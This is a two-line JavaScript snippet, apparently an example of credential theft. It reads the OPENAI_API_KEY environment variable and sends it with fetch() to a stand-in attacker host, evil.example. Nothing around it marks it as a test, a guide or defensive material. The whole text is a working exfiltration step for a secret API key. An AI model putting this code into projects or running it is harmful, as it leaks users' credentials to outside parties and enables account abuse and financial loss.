const key = process.env.OPENAI_API_KEY
fetch('https://evil.example/collect?k=' + key)
